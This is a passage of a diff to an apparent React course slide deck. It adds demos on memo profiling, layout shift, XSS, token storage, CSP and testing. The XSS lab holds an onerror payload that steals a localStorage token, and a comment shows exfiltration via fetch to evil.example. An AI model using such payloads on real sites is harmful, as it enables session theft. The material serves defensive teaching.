+      <button type="button" class="anim-step" data-d="-1" aria-label="Previous step">←</button>
+      <button type="button" class="anim-replay">replay</button>
+      <button type="button" class="anim-step" data-d="1" aria-label="Next step">→</button>
+      <span class="anim-say"><i>Before: click one job card. App renders, then JobList.</i><i>All 120 cards render too, for one changed highlight: a 42 ms commit.</i><i>After stable props, App and JobList still render.</i><i>Two cards render: the one that lost the highlight and the one that gained it. 118 are grey: skipped.</i><i>The commit drops to 5 ms. That number is the proof, not the code.</i></span>
+    </div>
+    </div>
+    <div class="demo bare" id="demo-memo">
+      <div class="row">
+        <span class="demo-tag">onSelect =</span>
+        <button type="button" class="dbtn" data-p="arrow"><code>(id) =&gt; setSelectedId(id)</code></button>
+        <button type="button" class="dbtn" data-p="setter"><code>setSelectedId</code></button>
+        <button type="button" class="dbtn" data-act="click">click the next job</button>
+        <span class="meter">rendered<b data-k="n">–</b></span>
+        <span class="meter">commit<b data-k="ms">–</b></span>
+      </div>
     </div>
     <div class="two tight">
       <pre><code>&lt;<span class="ty">Profiler</span> id=<span class="st">"JobList"</span>
@@ -754,6 +943,15 @@ fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
 <span class="ok">// &lt;img src="x"&gt; survives, onerror does not</span></code></pre>
       </div>
     </div>
+    <div class="demo bare" id="demo-xss">
+      <div class="row">
+        <span class="demo-tag">Render the employer's HTML as</span>
+        <button type="button" class="dbtn" data-m="text"><code>{job.description}</code></button>
+        <button type="button" class="dbtn" data-m="raw"><code>dangerouslySetInnerHTML</code></button>
+        <button type="button" class="dbtn" data-m="clean"><code>sanitize()</code>, then the same</button>
+      </div>
+      <div class="row"><span class="demo-hint" data-k="out"></span></div>
+    </div>
     <div class="key w">Other sinks to grep for: <code>innerHTML</code>, <code>eval</code>, <code>new Function</code>, and <code>href={job.applyUrl}</code>, where you allow only <code>https:</code> and <code>mailto:</code>. <code>{job.title}</code> is safe. Anything that bypasses JSX text is not.</div>
 </section>
 
@@ -761,12 +959,21 @@ fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
   <section class="slide" data-chip="MODULE 08 · VIDEO 5"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 5</div><div class="cx-page"><b>17</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 5 · Where to put a token</div>
     <h2>If JavaScript can read it, XSS can steal it</h2>
-    <table class="grid">
+    <table class="grid" id="tbl-store">
       <tr><th>Where</th><th>Can injected script read it?</th><th>Sent automatically?</th><th>Use it for</th></tr>
       <tr><td><code>localStorage</code></td><td><b style="color:var(--bad)">Yes.</b> One line sends it away.</td><td>No</td><td><b style="color:var(--bad)">Never for auth</b></td></tr>
       <tr><td>A variable in memory</td><td>Yes, while the tab is open</td><td>No</td><td>A short-lived access token, at most</td></tr>
       <tr><td>Cookie, <code>HttpOnly</code></td><td><b style="color:var(--good)">No</b></td><td>Yes, so it needs a CSRF defence</td><td><b style="color:var(--good)">The session or refresh token</b></td></tr>
     </table>
+    <div class="demo bare" id="demo-steal">
+      <div class="row">
+        <span class="demo-tag">The payload runs. It reads</span>
+        <button type="button" class="dbtn" data-s="ls"><code>localStorage.token</code></button>
+        <button type="button" class="dbtn" data-s="mem">a variable in memory</button>
+        <button type="button" class="dbtn" data-s="cookie"><code>document.cookie</code></button>
+      </div>
+      <div class="row"><span class="demo-hint" data-k="why"></span></div>
+    </div>
     <pre style="max-width:1040px"><code><span class="kw">Set-Cookie:</span> __Host-session=<span class="st">…</span>; Path=/; Secure; HttpOnly; SameSite=Lax</code></pre>
     <div class="key">CSRF is the price of cookies. <code>SameSite=Lax</code> keeps the cookie off cross-site POSTs. On top of that, check <code>Origin</code> or a CSRF token on every state-changing request, and never change state on a GET.</div>
 </section>
@@ -793,6 +1000,16 @@ fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
         <tr><td style="white-space:nowrap"><code>object-src</code><br><code>base-uri</code></td><td>Plugin embeds, and a <code>&lt;base&gt;</code> tag that re-points relative script URLs.</td></tr>
         <tr><td style="white-space:nowrap"><code>frame-ancestors</code></td><td>Other sites framing Rasmi to trick a click on “Apply now”.</td></tr>
       </table>
+    </div>
+    <div class="demo bare" id="demo-csp">
+      <div class="row">
+        <span class="demo-tag">Load the page</span>
+        <button type="button" class="dbtn" data-c="off">no CSP</button>
+        <button type="button" class="dbtn" data-c="on">with this policy</button>
+        <span class="dom" data-k="nonce">nonce script ·</span>
+        <span class="dom" data-k="inline">injected &lt;script&gt; ·</span>
+        <span class="dom" data-k="onerror">onerror= ·</span>
+      </div>
     </div>
     <div class="key g">Ship it as <code>Content-Security-Policy-Report-Only</code> first: same policy, nothing blocked, every violation reported. Switch to enforcing once the reports go quiet.</div>
 </section>
@@ -824,39 +1041,57 @@ fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
   <section class="slide" data-chip="MODULE 08 · VIDEO 6"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 6</div><div class="cx-page"><b>20</b> / 23</div><!--/catalyst-brand:chrome-->
     <div class="kicker">Lesson 6 · Baseline → budget → fix</div>
     <h2>Write the number down before you touch anything</h2>
+    <div class="anim" id="fx-budget" data-at="200,1000,1800,2600,3400">
     <div class="fig" style="max-width:1000px">
       <svg viewBox="0 0 1000 96" role="img" aria-label="A loop: baseline, budget, fix, prove, guard in CI, and back to baseline for the next release">
-        <rect x="0" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#22D3EE"/>
-        <text x="84" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">1 · Baseline</text>
-        <text x="84" y="46" text-anchor="middle" class="lbl s">median of 3 + RUM p75</text>
-        <path class="draw" pathLength="1" d="M168,31 L206,31" stroke="#64748B" fill="none"/>
-        <rect x="208" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#FBBF24"/>
-        <text x="292" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">2 · Budget</text>
-        <text x="292" y="46" text-anchor="middle" class="lbl s">a number per metric, in a file</text>
-        <path class="draw" pathLength="1" d="M376,31 L414,31" stroke="#64748B" fill="none"/>
-        <rect x="416" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#2196F3"/>
-        <text x="500" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">3 · Fix</text>
-        <text x="500" y="46" text-anchor="middle" class="lbl s">one change, one commit</text>
-        <path class="draw" pathLength="1" d="M584,31 L622,31" stroke="#64748B" fill="none"/>
-        <rect x="624" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#A78BFA"/>
-        <text x="708" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">4 · Prove</text>
-        <text x="708" y="46" text-anchor="middle" class="lbl s">same conditions, again</text>
-        <path class="draw" pathLength="1" d="M792,31 L830,31" stroke="#64748B" fill="none"/>
-        <rect x="832" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#34D399"/>
-        <text x="916" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">5 · Guard</text>
-        <text x="916" y="46" text-anchor="middle" class="lbl s">CI fails above budget</text>
-        <path d="M916,58 L916,80 L84,80 L84,62" stroke="#64748B" stroke-dasharray="4 4" fill="none"/>
-        <text x="500" y="94" text-anchor="middle" class="lbl s">next release, next baseline</text>
+        <g data-in="1">
+          <rect x="0" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#22D3EE"/>
+          <text x="84" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">1 · Baseline</text>
+          <text x="84" y="46" text-anchor="middle" class="lbl s">median of 3 + RUM p75</text>
+        </g>
+        <path data-in="2" class="draw" pathLength="1" d="M168,31 L206,31" stroke="#64748B" fill="none"/>
+        <g data-in="2">
+          <rect x="208" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#FBBF24"/>
+          <text x="292" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">2 · Budget</text>
+          <text x="292" y="46" text-anchor="middle" class="lbl s">a number per metric, in a file</text>
+        </g>
+        <path data-in="3" class="draw" pathLength="1" d="M376,31 L414,31" stroke="#64748B" fill="none"/>
+        <g data-in="3">
+          <rect x="416" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#2196F3"/>
+          <text x="500" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">3 · Fix</text>
+          <text x="500" y="46" text-anchor="middle" class="lbl s">one change, one commit</text>
+        </g>
+        <path data-in="4" class="draw" pathLength="1" d="M584,31 L622,31" stroke="#64748B" fill="none"/>
+        <g data-in="4">
+          <rect x="624" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#A78BFA"/>
+          <text x="708" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">4 · Prove</text>
+          <text x="708" y="46" text-anchor="middle" class="lbl s">same conditions, again</text>
+        </g>
+        <path data-in="5" class="draw" pathLength="1" d="M792,31 L830,31" stroke="#64748B" fill="none"/>
+        <g data-in="5">
+          <rect x="832" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#34D399"/>
+          <text x="916" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">5 · Guard</text>
+          <text x="916" y="46" text-anchor="middle" class="lbl s">CI fails above budget</text>
+          <path d="M916,58 L916,80 L84,80 L84,62" stroke="#64748B" stroke-dasharray="4 4" fill="none"/>
+          <text x="500" y="94" text-anchor="middle" class="lbl s">next release, next baseline</text>
+        </g>
       </svg>
     </div>
     <table class="grid">
-      <tr><th>Rasmi job page</th><th>Baseline</th><th>Budget</th><th>After</th><th>Fixed by</th></tr>
-      <tr><td><b>LCP</b> · lab, mobile</td><td><b style="color:var(--bad)">4.1 s</b></td><td>≤ 2.5 s</td><td><b style="color:var(--good)">2.2 s</b></td><td>Lazy editor (L2), hero image (L3)</td></tr>
-      <tr><td><b>TBT</b> · lab stand-in for INP</td><td><b style="color:var(--bad)">610 ms</b></td><td>≤ 200 ms</td><td><b style="color:var(--good)">140 ms</b></td><td>Lazy editor (L2), stable props (L4)</td></tr>
-      <tr><td><b>CLS</b> · lab</td><td><b style="color:var(--bad)">0.21</b></td><td>≤ 0.1</td><td><b style="color:var(--good)">0.02</b></td><td>Image dimensions, font fallback (L3)</td></tr>
-      <tr><td><b>Initial JS</b> · gzip</td><td><b style="color:var(--bad)">214 KB</b></td><td>≤ 120 KB</td><td><b style="color:var(--good)">102 KB</b></td><td>Lazy editor, two locales (L2)</td></tr>
-      <tr><td><b>INP</b> · field p75</td><td><b style="color:var(--bad)">320 ms</b></td><td>≤ 200 ms</td><td><b style="color:var(--good)">170 ms</b></td><td>Stable props, deferred query (L4)</td></tr>
+      <tr><th>Rasmi job page</th><th data-hl="1" class="hl-r">Baseline</th><th data-hl="2" class="hl-w">Budget</th><th data-hl="4" class="hl-g">After</th><th data-hl="3">Fixed by</th></tr>
+      <tr><td><b>LCP</b> · lab, mobile</td><td data-hl="1" class="hl-r"><b style="color:var(--bad)">4.1 s</b></td><td data-hl="2" class="hl-w">≤ 2.5 s</td><td data-hl="4" class="hl-g"><b style="color:var(--good)">2.2 s</b></td><td data-hl="3">Lazy editor (L2), hero image (L3)</td></tr>
+      <tr><td><b>TBT</b> · lab stand-in for INP</td><td data-hl="1" class="hl-r"><b style="color:var(--bad)">610 ms</b></td><td data-hl="2" class="hl-w">≤ 200 ms</td><td data-hl="4" class="hl-g"><b style="color:var(--good)">140 ms</b></td><td data-hl="3">Lazy editor (L2), stable props (L4)</td></tr>
+      <tr><td><b>CLS</b> · lab</td><td data-hl="1" class="hl-r"><b style="color:var(--bad)">0.21</b></td><td data-hl="2" class="hl-w">≤ 0.1</td><td data-hl="4" class="hl-g"><b style="color:var(--good)">0.02</b></td><td data-hl="3">Image dimensions, font fallback (L3)</td></tr>
+      <tr><td><b>Initial JS</b> · gzip</td><td data-hl="1" class="hl-r"><b style="color:var(--bad)">214 KB</b></td><td data-hl="2" class="hl-w">≤ 120 KB</td><td data-hl="4" class="hl-g"><b style="color:var(--good)">102 KB</b></td><td data-hl="3">Lazy editor, two locales (L2)</td></tr>
+      <tr><td><b>INP</b> · field p75</td><td data-hl="1" class="hl-r"><b style="color:var(--bad)">320 ms</b></td><td data-hl="2" class="hl-w">≤ 200 ms</td><td data-hl="4" class="hl-g"><b style="color:var(--good)">170 ms</b></td><td data-hl="3">Stable props, deferred query (L4)</td></tr>
     </table>
+    <div class="anim-bar">
+      <button type="button" class="anim-step" data-d="-1" aria-label="Previous step">←</button>
+      <button type="button" class="anim-replay">replay</button>
+      <button type="button" class="anim-step" data-d="1" aria-label="Next step">→</button>
+      <span class="anim-say"><i>Baseline: measure first, and write the method down.</i><i>Budget: a number per metric, in a file, before any fix.</i><i>Fix: one change per commit, so every number has a cause beside it.</i><i>Prove: measure again, under the same conditions.</i><i>Guard: CI fails the build above budget. Next release, next baseline.</i></span>
+    </div>
+    </div>
 </section>
 
   <!-- L8c · BUILD -->
@@ -982,6 +1217,998 @@ fireEvent.<span class="fn">click</span>(cards[<span class="st">2</span>]);
   });
   document.getElementById('stage').addEventListener('click',e=>{ e.clientX>innerWidth/2?next():prev(); });
   render();
+</script>
+<!-- Sandbox starter for this deck (React mode): one tab group per idea, each its own little
+     app. The sandbox reads these on a fresh project or a reset; see brand/sandbox.html. -->
+<script type="text/plain" data-sbx-file="App.tsx" data-sbx-first>
+import './styles.css';
+
+// Module 8 lab. Every idea comes with a real measurement: the Profiler, a layout-shift
+// observer, a payload that tries to steal a token, a CSP and a test runner. Each tab
+// group is its own small app: open a tab and the preview switches to it. Right-click a
+// group's label to fold it or turn it off.
+
+const ideas: [group: string, what: string][] = [
+  ['memo', 'the Profiler times each commit: memo skips only when every prop is the same'],
+  ['shift', 'a late image moves text that already painted, and the browser scores it'],
+  ['xss', 'one employer’s HTML as text, raw and sanitised: which one runs the payload'],
+  ['csp', 'a nonce policy blocks the injected scripts the sanitiser missed'],
+  ['testing', 'tests that find what the user sees, against a fake server'],
+];
+
+export default function App() {
+  return (
+    <main>
+      <h1>Module 8 lab</h1>
+      <p className="muted">Open a tab in any group to try that idea.</p>
+      <ol>
+        {ideas.map(([group, what]) => (
+          <li key={group}>
+            <b>{group}</b> · {what}
+          </li>
+        ))}
+      </ol>
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="styles.css">
+body {
+  font-family: system-ui, sans-serif;
+  margin: 20px;
+  color: #0f172a;
+}
+
+main {
+  display: grid;
+  gap: 12px;
+  max-width: 680px;
+}
+
+h1 { font-size: 20px; margin: 0; }
+h2 { font-size: 16px; margin: 0 0 4px; }
+h3 { font-size: 13px; margin: 0 0 6px; color: #475569; }
+ul, ol { margin: 0; padding-left: 20px; }
+li { margin: 4px 0; }
+label { display: grid; gap: 4px; }
+label.row { display: flex; }
+
+.row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.card { border: 1px solid #cbd5e1; border-radius: 10px; padding: 10px 12px; }
+.muted { color: #64748b; margin: 0; }
+.bad { color: #dc2626; margin: 0; }
+.good { color: #059669; margin: 0; }
+
+input,
+textarea,
+button {
+  font: inherit;
+  padding: 6px 10px;
+  border: 1px solid #cbd5e1;
+  border-radius: 8px;
+}
+
+textarea { font: 12.5px ui-monospace, monospace; }
+
+button {
+  background: #0f172a;
+  color: #fff;
+  cursor: pointer;
+}
+
+button:disabled { opacity: 0.45; cursor: default; }
+input[type='checkbox'] { padding: 0; }
+code, pre { font: 12.5px ui-monospace, monospace; }
+pre { background: #f1f5f9; padding: 8px 10px; border-radius: 8px; margin: 0; white-space: pre-wrap; word-break: break-all; }
+iframe { width: 100%; }
+
+.jobs { display: grid; grid-template-columns: repeat(auto-fill, minmax(70px, 1fr)); gap: 4px; }
+.job { background: #f8fafc; color: #0f172a; font-size: 11px; padding: 4px; border-radius: 6px; }
+.job[aria-pressed='true'] { background: #0f172a; color: #fff; }
+.cover { display: block; width: 100%; height: auto; border-radius: 8px; margin-bottom: 8px; }
+</script>
+<script type="text/plain" data-sbx-file="MemoDemo.tsx" data-sbx-group="memo" data-sbx-color="#22D3EE">
+import './styles.css';
+import { Profiler, useRef, useState, type ProfilerOnRenderCallback } from 'react';
+import { JobCard, rendered, type Job } from './JobCard';
+
+const jobs: Job[] = Array.from({ length: 120 }, (_, i) => ({ id: i, title: 'Job ' + (i + 1) }));
+
+// Click a job. With an arrow function as onSelect, every card gets a new prop on every
+// render, so memo compares, finds a difference and renders all 120. Tick the box to pass
+// the state setter instead: it never changes, so only the two cards whose isSelected
+// flipped render. The Profiler times every commit, here and in the console.
+export default function MemoDemo() {
+  const [selectedId, setSelectedId] = useState(0);
+  const [stable, setStable] = useState(false);
+  const out = useRef<HTMLOutputElement>(null);
+
+  // onRender runs after each commit. Setting state here would cause another commit, and
+  // another call, so it writes straight to the DOM.
+  const onRender: ProfilerOnRenderCallback = (id, phase, actualDuration) => {
+    const line = `${id} · ${phase} · ${actualDuration.toFixed(1)} ms · ${rendered.size} of ${jobs.length} cards rendered`;
+    console.log(line);
+    if (out.current) out.current.textContent = line;
+    rendered.clear();
+  };
+
+  return (
+    <main>
+      <h2>memo and the Profiler</h2>
+      <label className="row">
+        <input type="checkbox" checked={stable} onChange={(e) => setStable(e.target.checked)} />
+        <span>
+          pass <code>{'onSelect={setSelectedId}'}</code>, not <code>{'onSelect={(id) => setSelectedId(id)}'}</code>
+        </span>
+      </label>
+      <output ref={out} className="card">Click a job.</output>
+      <Profiler id="JobList" onRender={onRender}>
+        <div className="jobs">
+          {jobs.map((job) => (
+            <JobCard
+              key={job.id}
+              job={job}
+              isSelected={job.id === selectedId}
+              onSelect={stable ? setSelectedId : (id) => setSelectedId(id)}
+            />
+          ))}
+        </div>
+      </Profiler>
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="JobCard.tsx" data-sbx-group="memo">
+import { memo } from 'react';
+
+export type Job = { id: number; title: string };
+
+// The cards that rendered in the current commit. A Set, so the second render StrictMode
+// does in development isn't counted twice.
+export const rendered = new Set<number>();
+
+// A real card does work while it renders: formatting a date, a salary, a location. This
+// one spins for a quarter of a millisecond so the Profiler has something to measure.
+function work(ms: number) {
+  const end = performance.now() + ms;
+  while (performance.now() < end) {}
+}
+
+type Props = { job: Job; isSelected: boolean; onSelect: (id: number) => void };
+
+// memo compares each prop with Object.is and skips the render only if all are the same.
+export const JobCard = memo(function JobCard({ job, isSelected, onSelect }: Props) {
+  rendered.add(job.id);
+  work(0.25);
+  return (
+    <button className="job" aria-pressed={isSelected} onClick={() => onSelect(job.id)}>
+      {job.title}
+    </button>
+  );
+});
+</script>
+<script type="text/plain" data-sbx-file="ShiftDemo.tsx" data-sbx-group="shift" data-sbx-color="#FBBF24" data-sbx-shut>
+import './styles.css';
+import { useEffect, useState } from 'react';
+
+// A 1600 × 900 cover, drawn inline so the lab needs no network.
+const COVER =
+  'data:image/svg+xml,' +
+  encodeURIComponent(
+    '<svg xmlns="http://www.w3.org/2000/svg" width="1600" height="900">' +
+      '<rect width="1600" height="900" fill="#0e7490"/>' +
+      '<text x="800" y="490" font-size="120" text-anchor="middle" fill="#fff" font-family="sans-serif">Acme · Cairo</text></svg>',
+  );
+
+// Chrome's layout-shift entry. TypeScript's DOM types don't include it yet.
+type LayoutShift = PerformanceEntry & { value: number; hadRecentInput: boolean };
+
+// The text paints at once and the cover arrives 1.2 s later, the way a slow image does.
+// Without width and height the <img> is 0 px tall until then, so everything under it
+// jumps when it lands. With them, the browser reserves the box from the ratio and nothing
+// moves. The score is the browser's own, from a PerformanceObserver. Shifts within 0.5 s
+// of a click don't count, which is why the image takes longer than that.
+export default function ShiftDemo() {
+  const [sized, setSized] = useState(false);
+  const [run, setRun] = useState(0);
+  const [src, setSrc] = useState<string>();
+  const [cls, setCls] = useState(0);
+
+  useEffect(() => {
+    let total = 0;
+    setCls(0);
+    setSrc(undefined);
+    const po = new PerformanceObserver((list) => {
+      for (const e of list.getEntries() as LayoutShift[]) if (!e.hadRecentInput) total += e.value;
+      setCls(total);
+    });
+    po.observe({ type: 'layout-shift', buffered: false });
+    const t = setTimeout(() => setSrc(COVER), 1200);
+    return () => {
+      clearTimeout(t);
+      po.disconnect();
+    };
+  }, [run, sized]);
+
+  const verdict = cls > 0.25 ? 'poor' : cls > 0.1 ? 'needs improvement' : 'good';
+  return (
+    <main>
+      <h2>Reserve the box</h2>
+      <div className="row">
+        <label className="row">
+          <input type="checkbox" checked={sized} onChange={(e) => setSized(e.target.checked)} />
+          width and height on the img
+        </label>
+        <button onClick={() => setRun((n) => n + 1)}>Load again</button>
+      </div>
+      <p className={cls > 0.1 ? 'bad' : 'good'}>
+        CLS {cls.toFixed(3)} · {verdict}
+      </p>
+      <article className="card">
+        {sized ? (
+          <img src={src} alt="" width={1600} height={900} className="cover" />
+        ) : (
+          <img src={src} alt="" className="cover" />
+        )}
+        <h2>Frontend Engineer · Acme</h2>
+        <p className="muted">Cairo · hybrid · full time</p>
+        <p>Build the job board’s search with React and TypeScript, and keep it fast.</p>
+        <button>Apply now</button>
+      </article>
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="XssDemo.tsx" data-sbx-group="xss" data-sbx-color="#F8717A" data-sbx-shut>
+import './styles.css';
+import { useMemo, useSyncExternalStore, useState } from 'react';
+import DOMPurify from 'dompurify';
+
+// What one employer typed into the job description. The onerror handler is the attack.
+const PAYLOAD = '<b>Senior React role.</b> <img src="x" onerror="steal(localStorage.getItem(\'token\'))">';
+
+// The attacker's server, standing in for fetch('//evil.example?t=' + token). It is set up
+// before anything renders, so no payload can run ahead of it.
+let stolen: string[] = [];
+const listeners = new Set<() => void>();
+declare global {
+  interface Window {
+    steal: (token: unknown) => void;
+  }
+}
+window.steal = (token) => {
+  stolen = [...stolen, String(token)];
+  listeners.forEach((l) => l());
+};
+localStorage.setItem('token', 'rasmi-session-7f3a');
+const subscribe = (l: () => void) => (listeners.add(l), () => void listeners.delete(l));
+
+// The same HTML three ways into the page. Only the raw one runs the handler. Edit it:
+// try <svg onload="steal(1)">, or a link to javascript:steal(2), then click it.
+export default function XssDemo() {
+  const [html, setHtml] = useState(PAYLOAD);
+  const thefts = useSyncExternalStore(subscribe, () => stolen);
+  // React 19 compares the {__html} object, not the string inside it, and writes innerHTML
+  // again whenever the object is new. Without useMemo, every theft would re-render, rewrite
+  // the raw HTML and run the payload again.
+  const raw = useMemo(() => ({ __html: html }), [html]);
+  const clean = useMemo(() => ({ __html: DOMPurify.sanitize(html) }), [html]);
+
+  return (
+    <main>
+      <h2>React escapes text. Your HTML is on you.</h2>
+      <textarea
+        rows={3}
+        value={html}
+        onChange={(e) => {
+          stolen = [];
+          setHtml(e.target.value);
+        }}
+      />
+      <section className="card">
+        <h3>{'<div>{job.description}</div>'}</h3>
+        <div>{html}</div>
+      </section>
+      <section className="card">
+        <h3>dangerouslySetInnerHTML, raw</h3>
+        <div dangerouslySetInnerHTML={raw} />
+      </section>
+      <section className="card">
+        <h3>DOMPurify.sanitize first</h3>
+        <div dangerouslySetInnerHTML={clean} />
+      </section>
+      {thefts.length ? (
+        <p className="bad">✗ Stolen: {thefts.join(', ')}</p>
+      ) : (
+        <p className="good">✓ Nothing stolen.</p>
+      )}
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="CspDemo.tsx" data-sbx-group="csp" data-sbx-color="#A78BFA" data-sbx-shut>
+import './styles.css';
+import { useLayoutEffect, useMemo, useRef, useState } from 'react';
+
+const NONCE = 'R4nd0m';
+const START = `script-src 'nonce-${NONCE}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`;
+const WHAT: Record<string, string> = {
+  app: 'the app’s own script, with the nonce',
+  inline: 'an injected <script>',
+  onerror: 'an injected onerror=',
+  'script-src-elem': 'an injected <script>',
+  'script-src-attr': 'an injected onerror=',
+};
+
+// The page a server would send. Its own script carries the nonce; the injection the
+// sanitiser missed doesn't. Each script reports here when it runs, and the page reports
+// every violation. A <meta> policy can't be Report-Only and ignores frame-ancestors:
+// those need the real response header.
+function page(policy: string, enforce: boolean) {
+  const meta = enforce ? `<meta http-equiv="Content-Security-Policy" content="${policy.replace(/"/g, '&quot;')}">` : '';
+  return `<!doctype html>${meta}
+<script nonce="${NONCE}">
+  parent.postMessage({ ran: 'app' }, '*');
+  addEventListener('securitypolicyviolation', (e) => parent.postMessage({ blocked: e.effectiveDirective }, '*'));
+<\/script>
+<p>Job description</p>
+<script>parent.postMessage({ ran: 'inline' }, '*')<\/script>
+<img src="x" onerror="parent.postMessage({ ran: 'onerror' }, '*')">`;
+}
+
+// Edit the policy: drop the nonce, or add 'unsafe-inline' (a nonce makes browsers ignore
+// it). Untick enforce to see everything run.
+export default function CspDemo() {
+  const [policy, setPolicy] = useState(START);
+  const [enforce, setEnforce] = useState(true);
+  const [log, setLog] = useState<string[]>([]);
+  const frame = useRef<HTMLIFrameElement>(null);
+  const srcDoc = useMemo(() => page(policy, enforce), [policy, enforce]);
+
+  // A layout effect, so the listener is in place before the frame can load and report.
+  useLayoutEffect(() => {
+    setLog([]);
+    const on = (e: MessageEvent) => {
+      if (e.source !== frame.current?.contentWindow) return;
+      const d = e.data as { ran?: string; blocked?: string };
+      if (d.ran) setLog((l) => [...l, '✓ ran: ' + WHAT[d.ran!]]);
+      if (d.blocked) setLog((l) => [...l, '✗ blocked: ' + (WHAT[d.blocked!] ?? d.blocked)]);
+    };
+    addEventListener('message', on);
+    return () => removeEventListener('message', on);
+  }, [srcDoc]);
+
+  return (
+    <main>
+      <h2>CSP: the seatbelt</h2>
+      <label>
+        Content-Security-Policy
+        <textarea rows={2} value={policy} onChange={(e) => setPolicy(e.target.value)} />
+      </label>
+      <label className="row">
+        <input type="checkbox" checked={enforce} onChange={(e) => setEnforce(e.target.checked)} />
+        enforce it
+      </label>
+      <iframe ref={frame} title="The job page" sandbox="allow-scripts" srcDoc={srcDoc} className="card" height={60} />
+      <ul>
+        {log.map((l, i) => (
+          <li key={i} className={l.startsWith('✓ ran: an injected') ? 'bad' : l.startsWith('✗') ? 'good' : ''}>
+            {l}
+          </li>
+        ))}
+      </ul>
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="Tests.tsx" data-sbx-group="testing" data-sbx-color="#34D399" data-sbx-shut>
+import './styles.css';
+import { useState } from 'react';
+import { run, type Result } from './testkit';
+import { bugs } from './Jobs';
+import './jobs.test';
+
+// The tests run right here in the preview. Testing Library finds elements the way a
+// user does, by role and name; user-event clicks the way a user does; a fake server
+// answers fetch. In Rasmi, Vitest runs the same kind of test file in Node, with MSW.
+export default function Tests() {
+  const [results, setResults] = useState<Result[]>();
+  const [busy, setBusy] = useState(false);
+  const [broken, setBroken] = useState(false);
+
+  async function go() {
+    bugs.iconOnly = broken;
+    setBusy(true);
+    setResults(await run());
+    setBusy(false);
+  }
+
+  const failed = results?.filter((r) => !r.ok).length ?? 0;
+  return (
+    <main>
+      <h2>Test what the user sees</h2>
+      <label className="row">
+        <input type="checkbox" checked={broken} onChange={(e) => setBroken(e.target.checked)} />
+        break it: the Apply button becomes an arrow icon with no name
+      </label>
+      <div className="row">
+        <button onClick={go} disabled={busy}>
+          {busy ? 'Running…' : 'Run the tests'}
+        </button>
+        {results && (
+          <span className={failed ? 'bad' : 'good'}>
+            {results.length - failed} passed, {failed} failed
+          </span>
+        )}
+      </div>
+      {results && (
+        <ul className="card">
+          {results.map((r) => (
+            <li key={r.name} className={r.ok ? 'good' : 'bad'}>
+              {r.ok ? '✓' : '✗'} {r.name} <span className="muted">· {r.ms} ms</span>
+              {r.error && <pre>{r.error}</pre>}
+            </li>
+          ))}
+        </ul>
+      )}
+    </main>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="jobs.test.tsx" data-sbx-group="testing">
+import { screen } from '@testing-library/dom';
+import userEvent from '@testing-library/user-event';
+import { test, expect, render } from './testkit';
+import { server, http, HttpResponse } from './server';
+import { Jobs } from './Jobs';
+
+test('a seeker picks a job and applies', async () => {
+  const user = userEvent.setup();
+  render(<Jobs />);
+
+  await user.click(await screen.findByRole('button', { name: /^React Engineer/ }));
+  await user.click(screen.getByRole('button', { name: 'Apply now' }));
+
+  expect(await screen.findByRole('button', { name: /Application sent/ })).toBeDisabled();
+});
+
+test('shows a retry when the API fails', async () => {
+  server.use(http.get('/api/jobs', () => new Response(null, { status: 500 })));
+  render(<Jobs />);
+
+  expect(await screen.findByRole('alert')).toHaveTextContent(/try again/i);
+});
+
+test('lists whatever the server returns', async () => {
+  server.use(http.get('/api/jobs', () => HttpResponse.json([{ id: 9, title: 'Design Engineer' }])));
+  render(<Jobs />);
+
+  expect(await screen.findByRole('button', { name: 'Design Engineer' })).toBeInTheDocument();
+});
+</script>
+<script type="text/plain" data-sbx-file="Jobs.tsx" data-sbx-group="testing">
+import { useEffect, useState } from 'react';
+
+type Job = { id: number; title: string };
+
+// The feature under test: pick a job, apply, see it sent. The tests never look at a class
+// name or a state variable, only at roles and text, so this file can change shape freely.
+// The runner's checkbox switches on the one bug below.
+export const bugs = { iconOnly: false };
+
+export function Jobs() {
+  const [jobs, setJobs] = useState<Job[]>();
+  const [failed, setFailed] = useState(false);
+  const [picked, setPicked] = useState<Job>();
+  const [sent, setSent] = useState(false);
+
+  useEffect(() => {
+    fetch('/api/jobs')
+      .then((r) => {
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        return r.json() as Promise<Job[]>;
+      })
+      .then(setJobs, () => setFailed(true));
+  }, []);
+
+  async function apply(job: Job) {
+    await fetch('/api/applications', { method: 'POST', body: JSON.stringify({ job: job.id }) });
+    setSent(true);
+  }
+
+  if (failed) return <p role="alert">Couldn’t load the jobs. Try again.</p>;
